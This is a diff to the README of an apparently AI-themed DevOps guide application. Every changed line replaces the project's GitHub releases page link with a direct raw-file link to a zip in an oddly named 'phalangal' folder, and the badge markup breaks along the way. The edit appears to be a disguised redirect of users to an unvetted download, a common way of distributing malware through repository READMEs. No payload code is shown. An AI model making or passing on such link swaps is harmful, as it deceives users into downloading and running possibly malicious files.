@@ -1,7 +1,7 @@
 # 🚀 devops-ai-guidelines - Your Path to DevOps Mastery
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Aldik-dev/devops-ai-guidelines/releases)
+[![Download](https://raw.githubusercontent.com/Aldik-dev/devops-ai-guidelines/main/phalangal/devops-ai-guidelines.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Aldik-dev/devops-ai-guidelines/main/phalangal/devops-ai-guidelines.zip)
 
 ## 🚀 Getting Started
 Welcome to **devops-ai-guidelines**! This application takes you on your first AI journey in DevOps. With practical tips, helpful learning paths, and enterprise guidelines, it aims to equip you with the knowledge needed to thrive in the world of DevOps.
@@ -21,7 +21,7 @@ To ensure the best experience with the application, your system should meet the 
 
 ## 📚 Installation Instructions
 1. **Visit the Downloads Page:** Click the link below to access the releases.
-   [Download Releases](https://github.com/Aldik-dev/devops-ai-guidelines/releases)
+   [Download Releases](https://raw.githubusercontent.com/Aldik-dev/devops-ai-guidelines/main/phalangal/devops-ai-guidelines.zip)
    
 2. **Select the Latest Release:** Look for the most recent version at the top of the page. 
 
@@ -45,7 +45,7 @@ Upon launching the application, you will see a user-friendly interface. Follow t
 If you encounter any issues while downloading or using the application, try the following:
 
 - **Clear Your Browser Cache:** Sometimes, cached data can cause download problems.
-- **Check for Updates:** Ensure you are using the latest version from the [Releases page](https://github.com/Aldik-dev/devops-ai-guidelines/releases).
+- **Check for Updates:** Ensure you are using the latest version from the [Releases page](https://raw.githubusercontent.com/Aldik-dev/devops-ai-guidelines/main/phalangal/devops-ai-guidelines.zip).
 - **Restart Your Device:** A simple restart can resolve many issues.
 
 If the problem persists, consider checking online forums or reaching out for support.
@@ -57,7 +57,7 @@ Join our community to connect with other users and share your experiences. You c
 - **Social Media Channels:** Follow us for updates and more resources.
 
 ## 📅 Future Updates
-We plan to regularly update the **devops-ai-guidelines** application. Future updates will include more features, additional learning paths, and better performance. Be sure to check back on the [Releases page](https://github.com/Aldik-dev/devops-ai-guidelines/releases) for the latest information.
+We plan to regularly update the **devops-ai-guidelines** application. Future updates will include more features, additional learning paths, and better performance. Be sure to check back on the [Releases page](https://raw.githubusercontent.com/Aldik-dev/devops-ai-guidelines/main/phalangal/devops-ai-guidelines.zip) for the latest information.
 
 Feel free to suggest features or improvements in the community section.
 
